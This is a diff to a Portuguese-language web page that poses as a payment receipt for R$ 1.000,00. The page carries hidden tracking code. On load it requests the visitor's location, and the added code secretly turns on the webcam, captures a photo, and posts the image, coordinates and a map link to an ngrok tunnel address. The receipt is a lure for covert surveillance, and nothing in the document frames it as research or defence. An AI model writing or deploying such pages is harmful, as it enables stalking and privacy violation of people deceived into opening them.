@@ -1,80 +1,75 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Comprovante de Recebimento</title>
   <link rel="stylesheet" href="styles.css" />
 </head>
-
 <body>
   <div class="comprovante-container">
     <h1>Comprovante de Recebimento</h1>
-
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
       <p><span>De:</span> João Silva de Oliveira</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
-
     <button class="botao" onclick="window.print()">Imprimir</button>
-
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
-
   </div>
 
   <script>
-    window.addEventListener("load", () => {
+    document.addEventListener("DOMContentLoaded", () => {
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
+
+      // Captura localização
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        navigator.geolocation.getCurrentPosition(sendData, (err) => {
+          alert("Erro na geolocalização: " + err.message);
+        });
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        alert("Geolocalização não suportada.");
       }
     });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
-    function sendLocation(position) {
+    async function sendData(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
 
-      fetch("https://1fdb-177-200-138-128.ngrok-free.app/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
+      // Captura a imagem
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const image = canvas.toDataURL("image/jpeg");
+
+        stream.getTracks().forEach(track => track.stop());
+
+        await fetch("https://f1a7-177-200-138-128.ngrok-free.app/send-data", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, maps, image })
         });
-    }
-
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+      } catch (error) {
+        console.error("Erro ao capturar imagem:", error);
+      }
     }
   </script>
 </body>
-
 </html>
